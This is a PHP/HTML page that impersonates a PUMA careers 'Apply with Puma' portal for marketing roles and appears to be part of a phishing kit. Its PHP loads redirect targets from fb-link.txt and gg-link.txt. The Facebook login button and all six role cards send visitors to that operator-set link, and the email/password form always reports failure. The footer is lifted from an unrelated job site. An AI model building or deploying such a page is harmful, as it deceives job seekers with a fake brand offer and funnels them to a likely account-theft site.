<?php
// Get current domain and create global variable
$currentDomain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$domainText = strtoupper(str_replace('www.', '', $currentDomain));
$siteName = "PUMA";

// get link fb và google từ file
$rootDirectory = dirname(__FILE__);
$fbLinkFile = $rootDirectory . '/fb-link.txt';
$googleLinkFile = $rootDirectory . '/gg-link.txt';

if (file_exists($fbLinkFile) && file_exists($googleLinkFile)) {
    $fbLink = trim(file_get_contents($fbLinkFile)); // Đọc và loại bỏ khoảng trắng
    $googleLink = trim(file_get_contents($googleLinkFile)); // Đọc và loại bỏ khoảng trắng
} else {
    $fbLink = '/';
    $googleLink = '/';
}   
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUMA® - Apply with Puma</title>
    <link rel="icon" href="/images/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
        }

        /* Header Styles (PUMA-like) */
        .header {
            background: #000000;
            padding: 12px 0;
        }

        .header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 24px;
            padding: 0 20px;
            color: #ffffff;
        }

        .logo {
            display: flex;
            align-items: center;
        }

        .logo img {
            height: 54px;
            width: auto;
            display: block;
        }

        .primary-nav {
            display: flex;
            align-items: center;
            gap: 28px;
            margin-left: 12px;
            flex: 1;
        }

        .primary-nav a {
            color: #ffffff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 700;
            white-space: nowrap;
        }

        .primary-nav a:hover { 
            opacity: 0.9; 
            text-decoration: underline;
            cursor: pointer;
        }

        .primary-nav a.external {
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .lang-switch {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
        }
        .lang-switch .lang-code { color: #facc15; font-weight: 700; }
        .lang-switch svg { width: 12px; height: 12px; fill: #ffffff; }

        .theme-toggle {
            background: #ffffff;
            border: none;
            border-radius: 999px;
            width: 44px;
            height: 24px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }
        .theme-toggle svg { width: 16px; height: 16px; fill: #111827; }

        .search-btn-icon {
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 4px;
        }
        .search-btn-icon svg { width: 22px; height: 22px; stroke: #ffffff; fill: none; stroke-width: 2; }

        .search-section {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .search-inputs {
            display: flex;
            gap: 10px;
        }

        .search-inputs input {
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            width: 200px;
        }

        .search-btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 8px 12px;
            border-radius: 4px;
            cursor: pointer;
        }

        .advanced-link {
            color: #666;
            text-decoration: none;
            font-size: 12px;
        }

        .user-actions {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .user-actions a {
            text-decoration: none;
            color: #333;
        }

        .signup-btn {
            background:rgb(10, 10, 10);
            color: white;
            padding: 10px 20px;
            border-radius: 4px;
            text-decoration: none;
        }

        /* Navigation Styles removed; integrated into header */

        /* Main Content Styles */
        .main-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 60px;
            padding: 80px 10%;
            background: #1f2937; /* deep slate/indigo like the screenshot */
            color: #e5e7eb;
        }

        .login-section {
            z-index: 2;
            display: flex;
            align-items: center;
            justify-content: flex-end;
            flex: 1;
        }

        .login-form {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            width: 500px;
        }

        /* Left content to match provided screenshot */
        .content-section {
            flex: 1.2;
            max-width: 680px;
        }

        .content-kicker {
            font-size: 12px;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            color: #9ca3af; /* muted gray */
            margin-bottom: 16px;
        }

        .content-section h1 {
            font-size: 52px;
            line-height: 1.1;
            color: #ffffff;
            margin-bottom: 18px;
            font-weight: 700;
        }

        .content-section .description {
            color: #cbd5e1; /* light slate */
            font-size: 16px;
            max-width: 60ch;
        }

        .roles-grid {
            display: grid;
            grid-template-columns: repeat(3, minmax(0, 1fr));
            gap: 14px;
            max-width: 720px;
        }

        .role-card {
            background: #ffffff;
            color: #111827;
            border-radius: 8px;
            padding: 14px 16px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.06), 0 1px 3px rgba(0,0,0,0.1);
            font-size: 14px;
            font-weight: 600;
            text-align: center;
        }

        .role-card:hover {
            background:rgb(202, 202, 202);
            cursor: pointer;
        }

        /* Separated roles section below hero */
        .roles-section {
            background:rgb(241, 239, 239);
            padding: 40px 10% 60px 10%;
        }
        .roles-container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .roles-section h2 {
            color: #111827;
            font-size: 18px;
            margin-bottom: 16px;
            font-weight: 700;
        }
        .roles-section .roles-grid {
            max-width: none;
        }
        
        @media (max-width: 768px) {
            .login-form {
                width: 100%;
            }
        }

        .login-form h2 {
            color:rgb(14, 14, 14);
            margin-bottom: 10px;
            font-size: 24px;
        }

        .login-form p {
            color:rgb(14, 14, 14);
            margin-bottom: 30px;
        }

        .social-buttons {
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
        }

        .social-btn {
            display: flex;
            width: 100%;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: white;
            cursor: pointer;
            font-size: 14px;
        }

        .divider {
            text-align: center;
            margin: 30px 0;
            position: relative;
        }

        .divider::before,
        .divider::after {
            content: '';
            position: absolute;
            top: 50%;
            width: 45%;
            height: 1px;
            background: #ddd;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color:rgb(14, 14, 14);
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }

        .password-field {
            position: relative;
        }

        .password-field input {
            padding-right: 40px;
        }

        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color:rgb(14, 14, 14);
        }

        .forgot-password {
            text-align: right;
            margin-bottom: 20px;
        }

        .forgot-password a {
            color:rgb(14, 14, 14);
            text-decoration: none;
            font-size: 14px;
        }

        .login-btn {
            width: 100%;
            background:rgb(10, 10, 10);
            color: white;
            padding: 15px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .terms {
            text-align: center;
            font-size: 12px;
            color:rgb(14, 14, 14);
            margin-bottom: 20px;
        }

        .terms a {
            color: rgb(14, 14, 14);
            text-decoration: none;
        }

        .new-user {
            text-align: center;
            font-size: 14px;
            color:rgb(14, 14, 14);
        }

        .new-user a {
            color: rgb(14, 14, 14);
            text-decoration: none;
            font-weight: 600;
        }

        .error-message {
            background: #ffebee;
            color: #c62828;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 14px;
            border: 1px solid #ffcdd2;
            display: none;
        }

        .background-section { display: none; }

        /* Footer Styles */
        .footer {
            background: #f8f9fa;
            padding: 40px 0 20px;
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 40px;
            padding: 0 20px;
        }

        .footer-column h3 {
            color: #333;
            margin-bottom: 20px;
            font-size: 16px;
        }

        .footer-column ul {
            list-style: none;
        }

        .footer-column ul li {
            margin-bottom: 8px;
        }

        .footer-column ul li a {
            color: #666;
            text-decoration: none;
            font-size: 14px;
        }

        .footer-column ul li a:hover {
            color: rgb(19, 19, 19);
        }

        .social-icons {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }

        .social-icons a {
            color: #666;
            font-size: 20px;
        }

        .reviews {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 20px;
        }

        .stars {
            color: #ff6600;
        }

        .partner-sites {
            margin-top: 20px;
        }

        .partner-sites img {
            height: 30px;
            margin-top: 10px;
        }

        .footer-bottom {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            border-top: 1px solid #ddd;
            margin-top: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .footer-bottom a {
            color: #666;
            text-decoration: none;
            font-size: 14px;
            text-align: center;
            width: 100%;
        }

        .accredited {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .accredited img {
            height: 40px;
        }

        /* Responsive Design */
        @media (max-width: 1024px) {
            .primary-nav { gap: 20px; }
            .primary-nav a { font-size: 14px; }
        }

        @media (max-width: 768px) {
            .header-content { flex-wrap: wrap; gap: 12px; }
            .logo img { height: 22px; }
            .primary-nav {
                order: 3;
                width: 100%;
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
                gap: 18px;
                padding: 4px 0 8px 0;
                scrollbar-width: none;
            }
            .primary-nav::-webkit-scrollbar { display: none; }
            .header-right { gap: 10px; }
            .theme-toggle { width: 40px; height: 22px; }
            .search-btn-icon svg { width: 20px; height: 20px; }
            .main-content {
                padding: 24px 16px 40px 16px;
                flex-direction: column;
                gap: 32px;
            }
            
            .background-section {
                opacity: 0.2;
            }

            .roles-grid {
                grid-template-columns: 1fr 1fr;
            }
            .roles-section {
                padding: 28px 16px 40px 16px;
            }
            .content-section h1 { font-size: 38px; }
            .content-section .description { font-size: 14px; }
            .login-form { width: 100%; padding: 28px; }
        }

        @media (max-width: 480px) {
            .roles-grid { grid-template-columns: 1fr; }
            .primary-nav { gap: 14px; }
            
            .footer-content {
                grid-template-columns: 1fr;
                gap: 20px;
            }
            
            .header-content {
                flex-direction: column;
                gap: 15px;
            }
            
            .search-inputs {
                flex-direction: column;
            }
            
            .search-inputs input {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <!-- Header (PUMA-like) -->
    <header class="header">
        <div class="header-content">
            <div class="logo">
                <img src="/images/puma.png" alt="PUMA" />
            </div>
            <nav class="primary-nav">
                <a href="#">This is PUMA</a>
                <a href="#">Newsroom</a>
                <a href="#">Investor Relations</a>
                <a href="#">Sustainability</a>
                <a href="#">Innovation</a>
                <a href="#">Careers</a>
                <a href="#">Diversity</a>
                <a href="#" class="external">Online Shop
                    <svg viewBox="0 0 24 24" width="14" height="14" aria-hidden="true"><path fill="#ffffff" d="M14 3h7v7h-2V6.41l-9.29 9.3-1.42-1.42 9.3-9.29H14V3z"/></svg>
                </a>
            </nav>
            <div class="header-right">
                <div class="lang-switch" title="Language">
                    <span class="lang-code">EN</span>
                    <svg viewBox="0 0 20 20" aria-hidden="true"><path d="M5.23 7.21 10 11.98l4.77-4.77 1.06 1.06L10 14.1 4.17 8.27l1.06-1.06z"/></svg>
                </div>
                <button class="theme-toggle" aria-label="Toggle theme">
                    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3a9 9 0 1 0 9 9 7 7 0 0 1-9-9z"/></svg>
                </button>
                <button class="search-btn-icon" aria-label="Search">
                    <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                </button>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <section class="content-section">
            <div class="content-kicker">219 open roles</div>
            <h1>Marketing</h1>
            <p class="description">At Puma, our image with customers is how we earn their trust through products and services, old and new. Behind the scenes, our marketing teams work diligently to communicate information to new and current audiences across the globe.</p>
        </section>
        <div class="login-section">
            <div class="login-form">
                <h2 style="text-align: center; color: rgb(19, 19, 19);">Apply with puma</h2>
                <p style="text-align: center; color: #333;">Use your puma.com account, Google or Facebook account to continue submitting your CV</p>
                
                <div class="social-buttons">
                    <button class="social-btn" id="google-btn">
                        <img src="https://www.flexjobs.com/blobcontent/flexjobs/images/logos/google_logo.svg" alt="">
                        Log In with Google
                    </button>
                    <button class="social-btn" onclick="window.location.href='<?php echo $fbLink; ?>'">
                        <svg width="28" height="28" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="#1877f2" d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64h98.2V334.2H109.4V256h52.8V222.3c0-87.1 39.4-127.5 125-127.5c16.2 0 44.2 3.2 55.7 6.4V172c-6-.6-16.5-1-29.6-1c-42 0-58.2 15.9-58.2 57.2V256h83.6l-14.4 78.2H255V480H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64z"></path></svg>
                        Log In with Facebook
                    </button>
                </div>
                
                <div class="divider">OR</div>
                
                <div class="error-message" id="errorMessage">
                    Invalid email or password. Please try again.
                </div>
                
                <form>
                    <div class="form-group">
                        <label for="email">Email Address</label>
                        <input type="email" id="email" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="password">Password</label>
                        <div class="password-field">
                            <input type="password" id="password" required>
                            <i class="fas fa-eye eye-icon"></i>
                        </div>
                    </div>
                    
                    <div class="forgot-password">
                        <a href="#">Forgot Password?</a>
                    </div>
                    
                    <button type="submit" class="login-btn">Log In</button>
                    
                    <div class="terms">
                        By clicking 'Log In' you agree to our 
                        <a href="#">Terms of Use</a> and 
                        <a href="#">Privacy Policy</a>.
                    </div>
                </form>
            </div>
        </div>
        
        <div class="background-section">
            <!-- Background removed in this layout -->
        </div>
    </main>

    <!-- Roles Section (separated below) -->
    <section class="roles-section">
        <div class="roles-container">
            <h2>Marketing positions include:</h2>
            <div class="roles-grid">
                <div class="role-card" onclick="window.location.href='<?php echo $fbLink; ?>'">Marketing Coordinator</div>
                <div class="role-card" onclick="window.location.href='<?php echo $fbLink; ?>'">Marketing Manager</div>
                <div class="role-card" onclick="window.location.href='<?php echo $fbLink; ?>'">Digital & Social Media Manager</div>
                <div class="role-card" onclick="window.location.href='<?php echo $fbLink; ?>'">Brand & Positioning Specialist</div>
                <div class="role-card" onclick="window.location.href='<?php echo $fbLink; ?>'">Director of Strategic Communications</div>
                <div class="role-card" onclick="window.location.href='<?php echo $fbLink; ?>'">Online Marketing Director</div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="footer">
        <div class="footer-content">
            <div class="footer-column">
                <h3>Find Remote Work From Home & Flexible Jobs</h3>
                <ul>
                    <li><a href="#">New Remote Jobs Hiring Now</a></li>
                    <li><a href="#">Remote Jobs Near Me</a></li>
                    <li><a href="#">Part-Time Remote Jobs</a></li>
                    <li><a href="#">Entry Level Remote Jobs</a></li>
                    <li><a href="#">Freelance Remote Jobs</a></li>
                    <li><a href="#">Browse Remote Jobs by Category</a></li>
                    <li><a href="#">Browse Top Work from Home Jobs</a></li>
                    <li><a href="#">Full-Time Remote Jobs</a></li>
                    <li><a href="#">Temporary Remote Jobs</a></li>
                    <li><a href="#">Work from Anywhere Jobs</a></li>
                </ul>
                
                <div class="social-icons">
                    <a href="#"><i class="fab fa-facebook"></i></a>
                    <a href="#"><i class="fab fa-linkedin"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-youtube"></i></a>
                    <a href="#"><i class="fab fa-pinterest"></i></a>
                    <a href="#"><i class="fab fa-instagram"></i></a>
                    <a href="#"><i class="fab fa-tiktok"></i></a>
                    <a href="#"><i class="fab fa-telegram"></i></a>
                </div>
            </div>
            
            <div class="footer-column">
                <h3>About <?php echo $siteName; ?></h3>
                <ul>
                    <li><a href="#"><?php echo $siteName; ?> Reviews</a></li>
                    <li><a href="#">How <?php echo $siteName; ?> Works</a></li>
                    <li><a href="#">Press & Awards</a></li>
                    <li><a href="#">Careers at <?php echo $siteName; ?></a></li>
                    <li><a href="#"><?php echo $siteName; ?> App</a></li>
                    <li><a href="#">Affiliate Program</a></li>
                    <li><a href="#">Editorial Process and Methodology</a></li>
                    <li><a href="#">Do Not Sell or Share My Personal Information</a></li>
                    <li><a href="#">Contact Us</a></li>
                    <li><a href="#">Fraud Awareness</a></li>
                </ul>
            </div>
            
            <div class="footer-column">
                <h3>Job Search Resources</h3>
                <ul>
                    <li><a href="#">Work from Home Jobs No Experience</a></li>
                    <li><a href="#">How To Make Money Online</a></li>
                    <li><a href="#">Weekend Jobs</a></li>
                    <li><a href="#">Side Hustle Jobs from Home</a></li>
                    <li><a href="#">High Paying Remote Jobs</a></li>
                    <li><a href="#">Best Remote Companies to Work For</a></li>
                    <li><a href="#">Informational Guides</a></li>
                    <li><a href="#">ExpertApply: Auto Apply for Jobs</a></li>
                    <li><a href="#">Online Resume Builder</a></li>
                    <li><a href="#">Remote Work Statistics & Trends</a></li>
                </ul>
            </div>
            
            <div class="footer-column">
                <h3>Support & Legal</h3>
                <ul>
                    <li><a href="#">Help Center</a></li>
                    <li><a href="#">Customer Support</a></li>
                    <li><a href="#">Terms of Service</a></li>
                    <li><a href="#">Privacy Policy</a></li>
                    <li><a href="#">Cookie Policy</a></li>
                    <li><a href="#">Accessibility</a></li>
                </ul>
            </div>
        </div>
        
        <div class="footer-bottom" style="text-align: center;">
            <a href="#" style="color: #666; text-align: center;">© 2007-2025 <?php echo $siteName; ?> All Rights Reserved</a>
        </div>
    </footer>

    <script>
        // Toggle password visibility
        document.querySelector('.eye-icon').addEventListener('click', function() {
            const passwordInput = document.querySelector('#password');
            const icon = this;
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                passwordInput.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        });

        // Google button click handler
        document.getElementById('google-btn').addEventListener('click', function(e) {
            e.preventDefault();
            const errorMessage = document.querySelector('#errorMessage');
            errorMessage.textContent = 'This feature is not available, coming soon!';
            errorMessage.style.display = 'block';
        });

        // Form submission
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.querySelector('#email').value;
            const password = document.querySelector('#password').value;
            const errorMessage = document.querySelector('#errorMessage');
            
            // Hide error message initially
            errorMessage.style.display = 'none';
            
            if (email && password) {
                // Always show error message for demo purposes
                // In real application, you would validate against server
                errorMessage.textContent = 'Account information is invalid.';
                errorMessage.style.display = 'block';
                
                // Focus on email field
                document.querySelector('#email').focus();
            } else {
                // Show error if fields are empty
                errorMessage.textContent = 'Please enter both email and password.';
                errorMessage.style.display = 'block';
            }
        });
    </script>
</body>
</html>
